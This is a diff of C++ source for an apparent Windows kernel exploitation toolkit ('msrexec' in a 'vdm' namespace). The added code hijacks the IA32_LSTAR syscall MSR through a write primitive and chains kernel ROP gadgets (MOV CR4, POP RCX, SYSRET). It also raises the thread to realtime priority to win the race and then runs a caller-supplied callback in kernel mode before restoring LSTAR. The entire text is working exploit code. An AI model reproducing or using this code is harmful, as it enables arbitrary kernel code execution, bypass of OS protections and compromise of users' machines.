@@ -1,5 +1,14 @@
 #include "msrexec.hpp"
 
+void msrexec_handler()
+{
+	// restore LSTAR....
+	__writemsr(IA32_LSTAR_MSR, m_system_call);
+
+	// call usermode code...
+	//callback();
+}
+
 namespace vdm
 {
 	msrexec_ctx::msrexec_ctx(writemsr_t wrmsr)
@@ -11,14 +20,14 @@ namespace vdm
 					MOV_CR4_GADGET, "xxxx");
 
 		if (!m_sysret_gadget)
-			m_sysret_gadget = 
+			m_sysret_gadget =
 				utils::rop::find_kgadget(
-					SYSRET_GADGET, "xx");
+					SYSRET_GADGET, "xxx");
 
 		if (!m_pop_rcx_gadget)
 			m_pop_rcx_gadget =
 				utils::rop::find_kgadget(
-					POP_RCX_GADGET, "xx") + 2;
+					POP_RCX_GADGET, "xx");
 
 		if (m_kpcr_rsp_offset && m_kpcr_krsp_offset)
 			return;
@@ -56,12 +65,31 @@ namespace vdm
 		std::printf("> m_kpcr_rsp_offset -> 0x%x\n", m_kpcr_rsp_offset);
 		std::printf("> m_kpcr_krsp_offset -> 0x%x\n", m_kpcr_krsp_offset);
 		std::printf("> m_system_call -> 0x%p\n", m_system_call);
-		std::getchar();
 	}
 
 	void msrexec_ctx::exec(callback_t kernel_callback)
 	{
+		const thread_info_t thread_info =
+		{ 
+			GetPriorityClass(GetCurrentProcess()), 
+			GetThreadPriority(GetCurrentThread()) 
+		};
+
+		// make it so our thread is highest possible priority...
+		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
+		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
+
+		// we want to finish off our quantum...
+		while (!SwitchToThread());
+
+		// set LSTAR to first rop gadget... race begins here...
 		wrmsr(IA32_LSTAR_MSR, m_pop_rcx_gadget);
-		syscall_wrapper();
+
+		// go go gadget kernel execution...
+		syscall_wrapper(kernel_callback);
+
+		// reset thread priority...
+		SetPriorityClass(GetCurrentProcess(), thread_info.first);
+		SetThreadPriority(GetCurrentThread(), thread_info.second);
 	}
 }
